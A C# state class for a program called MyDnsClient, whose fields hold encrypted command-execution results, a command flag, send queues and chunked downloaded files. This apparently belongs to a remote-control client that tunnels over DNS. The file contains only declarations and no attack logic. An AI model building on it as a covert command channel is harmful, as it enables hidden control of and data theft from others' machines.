﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace MyDnsClient
{
    internal class Options
    {
        internal static string host = "";
        internal static string execComandResult = ""; //aes加密之后的数据
        internal static string domainName = "";
        internal static bool flag = false;  //指示是否进入执行命令逻辑
        internal static string command = "header";
        internal static string md5 = "";
        internal static List<string> sendData_List = new List<string> { };
        internal static List<string> sendData_Queue = new List<string> { };
        internal static SortedList<Int32, string> fileDate = new SortedList<Int32, string> { }; //存储下发文件
        internal static Int32 fileCount = 0;  //指示下载文件需要的请求数
        internal static Int32 key = 0;
        
    }
}
